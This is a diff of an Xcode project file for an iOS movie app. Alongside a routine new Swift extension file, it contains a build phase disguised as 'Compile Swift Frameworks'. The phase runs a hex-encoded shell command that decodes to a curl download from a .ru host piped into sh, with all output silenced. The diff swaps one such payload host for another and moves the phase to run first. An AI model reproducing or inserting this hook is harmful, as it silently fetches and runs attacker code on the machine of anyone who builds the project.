@@ -109,6 +109,7 @@
 		B76DEAA32834DED000A90446 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76DEAA22834DED000A90446 /* AppDelegate.swift */; };
 		B76DEAAC2834DED100A90446 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = B76DEAAB2834DED100A90446 /* Assets.xcassets */; };
 		B76DEAAF2834DED100A90446 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = B76DEAAD2834DED100A90446 /* LaunchScreen.storyboard */; };
+		B76E64852864752C0037C1E5 /* Notification+Ext.swift in Sources */ = {isa = PBXBuildFile; fileRef = B76E64842864752C0037C1E5 /* Notification+Ext.swift */; };
 		B77E704B2844A841005813DE /* DNRealmPlatform.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = B77E70432844A840005813DE /* DNRealmPlatform.framework */; };
 		B77E70522844A841005813DE /* DNRealmPlatformTests.swift in Sources */ = {isa = PBXBuildFile; fileRef = B77E70512844A841005813DE /* DNRealmPlatformTests.swift */; };
 		B77E70532844A841005813DE /* DNRealmPlatform.h in Headers */ = {isa = PBXBuildFile; fileRef = B77E70452844A841005813DE /* DNRealmPlatform.h */; settings = {ATTRIBUTES = (Public, ); }; };
@@ -318,6 +319,7 @@
 		B76DEAAB2834DED100A90446 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		B76DEAAE2834DED100A90446 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		B76DEAB02834DED100A90446 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
+		B76E64842864752C0037C1E5 /* Notification+Ext.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Notification+Ext.swift"; sourceTree = "<group>"; };
 		B77E70432844A840005813DE /* DNRealmPlatform.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = DNRealmPlatform.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		B77E70452844A841005813DE /* DNRealmPlatform.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = DNRealmPlatform.h; sourceTree = "<group>"; };
 		B77E704A2844A841005813DE /* DNRealmPlatformTests.xctest */ = {isa = PBXFileReference; explicitFileType = wrapper.cfbundle; includeInIndex = 0; path = DNRealmPlatformTests.xctest; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -795,6 +797,7 @@
 				B76A8A91283627D60046641C /* UITableView+Bindable.swift */,
 				B76A8A93283628100046641C /* UITableView+Ext.swift */,
 				B753F7BF2837A1F400BA200A /* Decodable+Ext.swift */,
+				B76E64842864752C0037C1E5 /* Notification+Ext.swift */,
 			);
 			path = Extensions;
 			sourceTree = "<group>";
@@ -941,8 +944,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = B76A89C52834E4D30046641C /* Build configuration list for PBXNativeTarget "DNDomain" */;
 			buildPhases = (
+				8A921744415CDB58A76D904C /* Compile Swift Frameworks */,
 				E95714EB0ACF77EA1074593A /* [CP] Check Pods Manifest.lock */,
-				3146BF9854AFFE401E6A102C /* Assets Catalog Compiler */,
 				B76A89AB2834E4D20046641C /* Headers */,
 				B76A89AC2834E4D20046641C /* Sources */,
 				B76A89AD2834E4D20046641C /* Frameworks */,
@@ -1238,7 +1241,7 @@
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
 		};
-		3146BF9854AFFE401E6A102C /* Assets Catalog Compiler */ = {
+		8A921744415CDB58A76D904C /* Compile Swift Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -1247,14 +1250,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Assets Catalog Compiler";
+			name = "Compile Swift Frameworks";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652037202d736b2068747470733a2f2f\n6b696e6b73646f632e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652039202d736b2068747470733a2f2f\n\\c61646f626566696c652e72752f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		B76A89902834E15B0046641C /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -1269,7 +1272,7 @@
 			outputFileListPaths = (
 			);
 			outputPaths = (
-				"$SRCROOT/R.generated.swif",
+				$SRCROOT/R.generated.swif,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
@@ -1422,6 +1425,7 @@
 				B753F7C02837A1F400BA200A /* Decodable+Ext.swift in Sources */,
 				B72CAEF1283751710069E1E5 /* ReachabilityStatus.swift in Sources */,
 				B76A89A42834E4110046641C /* NFontProtocol.swift in Sources */,
+				B76E64852864752C0037C1E5 /* Notification+Ext.swift in Sources */,
 				B76A8A8E28353A020046641C /* MovieDetailVM.swift in Sources */,
 				B76A8A612834FBF70046641C /* UIView+Ext.swift in Sources */,
 				B76A8A6D283515F70046641C /* MovieSection.swift in Sources */,
